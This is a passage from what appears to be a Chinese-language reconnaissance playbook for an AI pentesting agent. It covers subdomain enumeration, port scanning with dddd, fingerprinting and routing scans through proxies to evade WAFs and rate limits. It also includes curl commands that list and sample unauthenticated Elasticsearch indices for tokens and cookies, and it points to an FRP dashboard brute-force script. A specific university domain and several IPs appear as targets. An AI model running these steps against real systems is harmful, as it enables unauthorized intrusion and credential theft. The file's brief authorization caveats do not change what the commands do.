  -d "{\"query\":\"domain: ${TARGET}\",\"start\":0,\"size\":200}" | \
  python3 -c "
import sys,json
d=json.load(sys.stdin)
hosts=set()
for i in d.get('data',[]):
    h=i.get('service',{}).get('http',{}).get('host','')
    ip=i.get('ip','')
    p=i.get('port','')
    t=i.get('service',{}).get('http',{}).get('title','')
    s=i.get('service',{}).get('http',{}).get('server','')
    if h: hosts.add(h)
    print(f'{h or ip}:{p} | {t} | Server: {s}')
print(f'\n共 {len(hosts)} 个独立域名')
"

echo "[3/5] 子域名解析 IP"
for sub in $(cat subdomains.txt); do
  ip=$(curl -s -o /dev/null -w "%{remote_ip}" --connect-timeout 3 "https://${sub}" 2>/dev/null)
  [ -n "$ip" ] && [ "$ip" != "0.0.0.0" ] && echo "${sub} => ${ip}"
done | sort -t'>' -k2 | uniq

echo "[4/5] 端口扫描 (dddd)"
# 扫描发现的每个 IP
for ip in $(cat ips.txt); do
  echo "--- ${ip} ---"
  /home/c1ay/.local/bin/dddd -t ${ip} -p 21,22,25,80,443,445,1433,3306,3389,5432,6379,8080,8443,8888,9090 2>&1 | grep -E "PortScan|Web|Finger"
done

echo "[5/5] 汇总报告"
```

**流程要点：**
1. **crt.sh** 先跑（免费、快速、被动），拿到基础子域名列表
2. **Quake API** 补充（付费但全面），同时获取标题和Server头指纹
3. **子域名解析** 去重归类，识别IP段和CDN
4. **dddd 端口扫描** 按IP段扫描，避免重复
5. **汇总** 按IP段分组，标注技术栈和风险

## 大型目标信息收集：分阶段策略

目标含 70+ 子域名、15+ IP、多区域部署（如教育网+移动云）时，单次 delegate_task 会因 Quake API 限速、curl 超时、dddd 扫描耗时超过 600s 超时限制，导致结果截断。**应采用分阶段策略：**

### 阶段一：被动收集（主会话内运行）
```bash
# crt.sh 收集所有子域名
curl -s "https://crt.sh/?q=%25.xawl.edu.cn&output=json" | python3 -c "
import sys,json
d=json.load(sys.stdin)
[print(n) for n in sorted({e for i in d for e in i['name_value'].split('\n') if '*' not in e and e.strip()})]"

# Quake API 收集中（使用脚本直接调用，避免子代理超时）
curl -s -X POST "https://quake.360.net/api/v3/search/quake_service" \
  -H "Content-Type: application/json" \
  -H "X-QuakeToken: <TOKEN>" \
  -d '{"query": "domain: xawl.edu.cn", "start": 0, "size": 500}'
```

### 阶段二：域名解析 + IP段归类（本地脚本）
将 Quake 结果中所有域名解析到 IP，按 /24 段分组，标记教育网/公网/云服务商。

### 阶段三：按 IP 段分批 delegate_task
每批 3-5 个 IP，用 delegate_task 并行扫描，避免单个任务超时：
- 批次1：主站 IP（112.46.132.23）— 重点端口
- 批次2：OA/教务/CAS IP — Web指纹 + 路径探测
- 批次3：VPN/堡垒机/人脸识别 — 非标端口

### 阶段四：汇总报告
合并所有批次结果，去重，按「域名 | 系统名称 | 指纹(Server) | 存活状态」格式输出。

## Pitfalls

1. **大型目标 delegate_task 超时** — 70+ 子域名时，单次 delegate_task 的 600s 超时容易被 Quake 限速（返回大量数据）和 curl 连接超时消耗殆尽。使用分阶段策略（阶段二、三）避免。
2. **SPA fallback 掩盖真实端点状态** — Vue.js/React SPA 配置 `try_files $uri /index.html` 时，`/actuator`、`/swagger-ui.html`、`/druid/` 全部返回 200 text/html（实际是 index.html）。检测方法：对比响应体大小（与首页一致则为 SPA fallback），或用 `Accept: application/json` 头发送请求看返回格式。
3. **指纹误报：404 页面匹配** — 路径探测返回 404/5xx 时 body 内容是通用错误页，宽泛 pattern 容易误命中。`web_fingerprint.py` 已对 body/header 探测做 status code 过滤（仅匹配 2xx），新增 probe 时务必保持此逻辑
3. **指纹误报：宽泛 body 匹配** — 短字符串（`A8`、`NC`、`用友`、`致远`）在大型站点上极容易误匹配。规则要加上下文限定，如 `致远软件` 而非 `致远`，`A8\\\\+.*?协同` 而非 `A8`。实测百度会误报 ThinkPHP/ASP.NET/致远OA/用友ERP，收紧 pattern 后零误报
3. **probe pattern 不要过于宽泛** — 如 `/nacos/` 探测匹配 `Nacos|nacos-console` 会误报，应改为 `nacos-console|Nacos v\\d|Nacos Login`。`/captcha` 探测不应匹配 body（太泛），改为匹配 header 中的 `think_var|thinkphp`
3. **指纹扩展参考** — 新增指纹规则前先看 `references/fingerprint-research.md`，里面有 TideFinger/Wappalyzer 的匹配逻辑和国内 OA/ERP 指纹速查表
4. **Legal authorization** - Always get written permission before active scanning
5. **Rate limiting** - dddd 快速端口发现依赖 masscan / Windows rustscan 包装器，注意控制速率
6. **Scope creep** - Stay within authorized scope; don't scan adjacent IPs
7. **DNS zone transfers** - Often blocked; don't rely on them
8. **False positives** - afrog的PoC结果需要手动验证
9. **IPv6** - Don't forget to scan IPv6 addresses if present
10. **Cloud IPs** - May be shared hosting; findings could affect other tenants
11. **dddd输出** - 结果文件可能包含大量数据，注意筛选
12. **afrog搜索引擎** - v3.5.3 仅支持 ZoomEye！`-cs quake/fofa/shodan` 参数被CLI接受但后端未实现，会报 "api key is empty"。配置文件格式必须是 `cyberspace.zoom_eyes`，其他格式均无效。需要 Quake 等搜索引擎时，使用 curl 调用 API + 手动喂目标给 afrog
13. **Quake API 字段名** - `quake_service` 端点不支持 `service.port` 等细粒度过滤字段，只用 `query` 参数即可。API 域名已迁移到 `quake.360.net`，旧域名 `quake.360.cn` 返回 308 重定向
14. **子域名扫描顺序** - 先 crt.sh（免费快速）→ 再 Quake API（全面）→ 解析IP去重 → dddd按IP扫描。避免对同一IP重复扫描
15. **报告必须全量** - 用户明确要求"之后信息收集的内容我都需要全量的信息"。每个子域名的每个端口/协议都要单独一行列出，绝不能用 "xxx 等 N 个" 省略。38个域名展开为66条记录是正确做法
16. **报告必须有探活章节** - 用户要求新增探活环节，格式为「域名 | 系统名称 | 指纹(Server) | 存活状态」。Quake 返回的数据本身就是最近一次扫描确认存活的服务，可直接作为探活依据
多端口独立探测 — 安防/人脸识别/门禁系统常在同一 IP 上运行多个端口（如 :9520 + :9526），每个端口是独立的 Web 应用。dddd 扫描发现非标端口后，**每个端口都要单独做完整的路径探测和指纹识别**，不要只扫主端口就下结论。不同端ports 的 config.js、后端路径、认证域可能完全不同。

## dddd 代理扫描（中国目标绕过 WAF/速率限制）

中国目标常部署 WAF 或速率限制，直接扫描会被封 IP。通过 SOCKS5/HTTP 代理转发扫描流量可规避。

```bash
# 通过 HTTP 代理扫描
dddd -t 目标云服务器IP --proxy "http://127.0.0.1:7890"

# 代理 + 指定端口
dddd -t 目标云服务器IP -p "22,80,443,8080,8081,8082,8083,8443,9200,7000,7001" \
  --proxy "http://127.0.0.1:7890"
```

**注意：** 使用代理时 dddd 会自动测试代理连通性（`测试代理中` + `代理有效！测试URL返回码: 200`），代理不可用时 dddd 会降级为直连。首次使用代理扫描耗时比直连长约 30%（因代理转发延迟）。

## Elasticsearch 未授权访问发现（端口 9200/9201）

Elasticsearch 默认监听 9200 端口，大量生产环境因配置缺失未开启认证。这是信息收集阶段的**高价值发现**——ES 中常存储日志数据（含用户 Cookie、Token、API Key）。

### 快速验证

```bash
# 1. 验证 ES 是否存活（返回集群信息 = 未认证）
curl -sk --connect-timeout 10 "http://TARGET:9200/"
# 响应: {"name":"es-node-01","cluster_name":"prod","version":{"number":"8.11.0"}}

# 2. 列出所有索引
curl -sk --connect-timeout 10 "http://TARGET:9200/_cat/indices?v&s=index"
# green  open  .ds-logs-app-2026.06.30   1 1  24590  0  21.3mb  10.6mb
# green  open  app-logs-2026.06           5 1  56789  0  45.2mb  22.6mb

# 3. 查看索引数据量排序
curl -sk --connect-timeout 10 "http://TARGET:9200/_cat/indices?h=index,docs.count,store.size&s=docs.count:desc&v"

# 4. 集群节点信息
curl -sk --connect-timeout 10 "http://TARGET:9200/_nodes/process?pretty"

# 5. 集群健康状态
curl -sk --connect-timeout 10 "http://TARGET:9200/_cluster/health?pretty"

# 6. 采样索引数据
curl -sk --connect-timeout 10 "http://TARGET:9200/INDEX_NAME/_search?size=3&pretty"
```

### 高价值索引类型

| 索引模式 | 内容 | 价值 |
|---------|------|------|
| `.ds-logs-nginx-*` | Nginx 访问日志 | ⭐⭐ 可还原 API 调用链 |
| `.ds-logs-app-*` / `app-logs-*` | 应用日志 | ⭐⭐⭐ 常含 Token/Cookie/调试信息 |
| `.ds-metrics-*` | 系统指标 | ⭐ 性能数据，辅助分析 |
| `.ds-logs-audit-*` | 审计日志 | ⭐⭐ 用户操作记录 |
| `*-security-*` / `*-auth-*` | 安全日志 | ⭐⭐⭐ 登录记录、权限变更 |

### ES 速率限制应对

中国厂商的 ES 常见前置 nginx 做速率限制（`Retry-After: 120` 头 + 空 body 403）。遇到此情况的应对策略：

```bash
# 等待限速重置（Retry-After 值）
sleep 120
curl -sk --connect-timeout 10 "http://TARGET:9200/_cat/indices?v"

# 每次请求后等待
for idx in $(curl -sk "http://TARGET:9200/_cat/indices?h=index" 2>/dev/null); do
  echo "=== $idx ==="
  curl -sk "http://TARGET:9200/$idx/_count?pretty"
  sleep 15
done
```

### 参考

- `references/es-discovery.md` — Elasticsearch 未授权访问完整方法论（批量导出、数据提取、安全分析）
- `references/anonymous-disclosure-investigation.md` — 匿名漏洞披露事件调查方法论：多源三角验证（vuln-corpus + 检测规则仓库 + 情报报告），重建已删除仓库内容

## WAF/速率限制识别（中国目标常见模式）

信息收集时遇到返回 `403 Forbidden` + `Retry-After: 120` + `Content-Length: 0` 的模式——这是中国服务器端**速率限制/连接数限制**，不是 WAF 拦截。

```bash
# 速率限制特征
HTTP/1.1 403 Forbidden
Connection: close
Retry-After: 120
Content-Length: 0

# 区分速率限制 vs WAF:
# 1. 速率限制 → 同上（短、无 body、有 Retry-After）
# 2. WAF 拦截 → 有 body（拦截页）、无 Retry-After、Server 头含 WAF 品牌（cf-ray / SafeLine 等）
# 3. 认证拒绝 → 401 + WWW-Authenticate 头 + 有 body
# 4. 网络 ACL 拒绝 → 直接超时无响应

# 应对策略
# 增加间隔 → 降低请求频率
sleep 120  # 等待 Retry-After 指定的秒数

# 通过代理转发 → 绕过源 IP 限速
curl -sk --proxy http://127.0.0.1:7890 "http://TARGET:9200/"

# 非标端口可能不受限速影响（同一服务在不同端口的限速策略不同）
curl -sk --connect-timeout 10 "http://TARGET:7001/"
```

## 用户偏好：目标聚焦规则

**用户明确要求：信息收集时严格聚焦于当前目标，不探索子域名/相关基础设施/同企业其他系统。**

```text
用户给了一个 IP（118.25.79.244）→ 只扫这个 IP 的所有端口和服务。
不要去查反解析域名、不要搜子域名、不要看同企业其他站点（如 unionsoft.cn demo/oa/cloud 等）。
即使发现了新的域名（如 www.cdmixc.unionsoft.cn），也不要去探测——除非用户特别要求。
```

**触发规则：**
- 用户给的是 **IP 地址** → 只扫这个 IP，所有端口
- 用户给的是 **域名（无上下文）** → 先解析 IP，然后聚焦该 IP
- 用户明确说要「看看这个站」→ 聚焦该域名/IP，不探索关联资产
- 用户说「信息收集这个目标」→ 可以通过子域名/关联资产扩大面，**但仅限目标域本身**

**例外：** 用户之前说过「这个企业全扫」或上下文明确要求资产发现时，再展开到子域名和相关 IP。
19. **Vite CVEs 仅影响开发服务器，不影响生产构建** — 所有已知 Vite CVE (CVE-2023-34092、CVE-2024-23331、CVE-2025-30205、CVE-2025-31125) 只影响 `vite dev` 开发服务器。生产构建产物由 nginx 托管静态文件，Vite 自身在构建后已下线。发现 Vue 3 + Vite 构建的 SPA 时，检查 `/@vite/client` 或 `__open-in-editor` 是否返回 200 即可确认是否暴露了开发服务器。如果返回 404 → 生产构建，Vite 漏洞不可用。
20. **Null 字节注入作为后端指纹** — 对发现的 API 端点测试 `%00` (null 字节) 注入：`GET /api/auth/me%00`。如果返回 **500 Internal Server Error** → 高度疑似 **Go 后端**（Go 的 net/http 路由对 null 字节处理不当会导致 panic）。如果返回 400/404 → 非 Go 后端。这是一个低成本的后端类型判别方法，应在后端类型不明时优先执行。
21. **`/assets/` 目录列取暴露旧构建版本** — Vite 构建时 nginx 可能开启 `autoindex on`。`/assets/` 目录下会列出所有历史 JS/CSS 构建版本（不同 hash 文件名）。虽然同一源代码的不同 hash 输出差异极小，但目录列取本身是一个配置缺陷标志——如果 `/assets/` 开了 autoindex，其他敏感目录（如 `/uploads/`、`/backup/`、`/config/`）可能也开了。检查方法：`curl -sk http://target/assets/`，如果返回 HTML 文件列表则确认。
22. **FRP Dashboard 批量爆破脚本** — 使用 `scripts/frp_brute.py` 进行多线程爆破，使用 `scripts/frp_dict_gen.py` 生成 FRP 场景专用字典。FRP 的认证端点无频率限制，可稳定维持 10+ req/s。详细方法论见 `references/frp-server-recon.md`。

## Verification

After reconnaissance:
- Verify discovered hosts are in scope
- Cross-reference dddd and afrog findings
- Document all findings with timestamps
- Check for false positives in vulnerability results
- Preserve scan outputs for reporting
